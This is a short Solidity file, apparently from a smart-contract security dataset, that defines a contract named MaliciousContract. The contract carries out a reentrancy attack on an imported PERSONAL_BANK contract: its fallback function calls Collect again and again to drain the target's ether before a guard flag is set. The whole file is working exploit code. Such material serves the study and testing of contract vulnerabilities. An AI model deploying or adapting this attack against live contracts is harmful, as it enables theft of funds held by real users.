pragma solidity ^0.4.19;

import "../dataset/reentrancy/0x01f8c4e3fa3edeb29e514cba738d87ce8c091d3f.sol";


contract MaliciousContract {
    PERSONAL_BANK personalBank;
    bool attackInitiated;

    constructor(address _personalBank) public {
        personalBank = PERSONAL_BANK(_personalBank);
    }

    function attack() public payable {
        require(!attackInitiated, "Attack already initiated");
        require(msg.value >= 1 ether, "Must send at least 1 ether");

        // Call the vulnerable function to start the reentrancy attack
        
        personalBank.Collect(msg.value);

        attackInitiated = true;
    }

    function deposit() public payable{
        require(msg.value >= 1 ether, "Must send at least 1 ether");
        personalBank.Deposit.value(msg.value)();
    }


    function() payable public {
        // Re-enter the vulnerable function if there's still balance to collect
        if (!attackInitiated && address(personalBank).balance >= 1 ether) {
            personalBank.Collect(1 ether);
        }
    }
}
